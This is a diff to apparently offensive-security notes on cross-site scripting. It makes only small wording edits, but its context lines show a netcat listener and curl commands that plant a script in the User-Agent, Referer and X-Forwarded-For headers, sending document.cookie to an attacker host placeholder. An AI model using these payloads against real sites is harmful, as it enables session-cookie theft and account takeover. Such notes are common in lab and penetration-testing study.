@@ -20,7 +20,7 @@ Locate reflection: HTML text, attribute, script, DOM sink.
 nc -lvnp 80
 # or: python3 -m http.server 80
 ```
-- No cookie shows up → check `HttpOnly` in the response's `Set-Cookie` header (DevTools → Network, or `curl -i`); `document.cookie` can't read an `HttpOnly` cookie at all.
+- No cookie shows up → check `HttpOnly` in the response's `Set-Cookie` header (DevTools → Network, or `curl -i`); `document.cookie` can't read an `HttpOnly` cookie.
 
 ## XSS → admin action
 Steal the session cookie or run the action from inside the admin's own session:
@@ -47,4 +47,4 @@ curl -s http://<IP>/ -A '<script>fetch("http://<KALI>/?c="+document.cookie)</scr
 curl -s http://<IP>/ -H 'Referer: <script>fetch("http://<KALI>/?c="+document.cookie)</script>'
 curl -s http://<IP>/ -H 'X-Forwarded-For: <script>fetch("http://<KALI>/?c="+document.cookie)</script>'
 ```
-- Only fires once an admin views the log in a browser — confirm a listener hit before assuming it's dead.
+- Only fires once an admin views the log in a browser. Confirm a listener hit before assuming it's dead.
